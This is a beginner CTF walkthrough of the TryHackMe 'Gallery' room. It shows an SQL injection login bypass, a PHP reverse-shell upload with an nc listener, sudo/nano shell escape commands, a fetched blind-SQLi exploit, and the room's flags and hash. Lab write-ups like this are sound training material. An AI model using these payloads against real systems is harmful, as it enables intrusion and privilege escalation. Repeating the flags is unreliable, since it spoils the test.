Hello everyone\! This is a beginner-friendly room from the TryHackMe platform titled “**Gallery**”

This room is classified as easy and is a walkthrough-type challenge. I hope this write-up helps guide you through the process\!

My goal is to help you understand each step and provide clear explanations so that anyone, whether a beginner or experienced, can follow along and understand the reasoning behind each action. I hope this write-up makes the process smoother and easier to grasp.

Enough talk — let’s dive right in, and I hope you enjoy the journey\! :)

![][image3]

We start with visiting the victim IP and we see the default Apache Page

![][image4]

Now moving to nmap:

![][image5]

***nmap 10.10.80.251 \-O \-sV***

**ports 80 and 8080** open. Port 80 was nothing major — so I checked **8080**

2 ports open

Opened [**http://10.10.80.251:8080**](http://10.10.80.251:8080/) — displayed a simple login form

![][image6]

Entered SQL injection payload into the form

Username: admin’ or 1=1 \#

Clicking enter we are in the cms portal

![][image7]

Simple Image Gallery

Inside the dashboard, went to **User Profile** → found an **Upload** section

![][image8]

Prepared a PHP reverse shell payload (php-rev-shell.php)

In my terminal :

![][image9]

***nc \-lvnp 4444***

Triggered the file — got a shell connection back

Then Stabilizing the shell as I had an some unresponsive states and errors

![][image10]

***python3 \-c ‘import pty; pty.spawn(“/bin/bash”)’***

***stty raw \-echo; fg***  
***reset***

Now inside the shell:

![][image11]

***cd /home/mike***  
***ls \-la***  
***cat user.txt***

It shows permission denied

I immediately head to /var \-\> /backup

![][image12]

***cat .backup\_history***

![][image13]

## **sudo \-lb3stpassw0rdbr0xx**

Now Interpreted as sudo \-l **and** the password b3stpassw0rdbr0xx for Mike

Subscribe

Using this pasword to access mike

![][image14]

***su mike***

***b3stpassw0rdbr0xx***

After login:

***cd /home/mike***  
***cat user.txt***

Then we get user.txt flag:

THM{af05cd30bfed67849befd546ef}

Now moving to root escalation

*Checking **sudo \-l***

Output: allowed sudo /bin/bash /opt/rootkit.sh *without password*.

Viewed the script

***cat /opt/rootkit.sh***

Saw it used nano for editing

Run

***sudo /bin/bash /opt/rootkit.sh***

![][image15]

Inside Nano: used the read command to inject:

1. ctrl \+ r  
2. ctrl \+ x  
3. press enter  
4. paste this : **reset; sh 1\>&0 2\>&0**  
5. press enter and you will see the \#

Now in the shell enter /root

![][image16]

***cd /root***  
***ls \-la***  
***cat root.txt***

THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}

Now we need to find the hash so for that I had to follow the script which I came across in a video by Tyler Rambsey

In terminal

![][image17]

***wget [https://raw.githubusercontent.com/musyoka101/Simple-Image-Gallery-1.0-blind-SQL-Injection/.../exploit.py](https://raw.githubusercontent.com/musyoka101/Simple-Image-Gallery-1.0-blind-SQL-Injection/.../exploit.py)***

**Then**

***chmod \+x exploit.py***

Running the script:

![][image18]

***python3 exploit.py http://10.10.80.251:8080/***

After 3–4 minutes we get the output:

a228b12a08b6527e7978cbe5d914531c
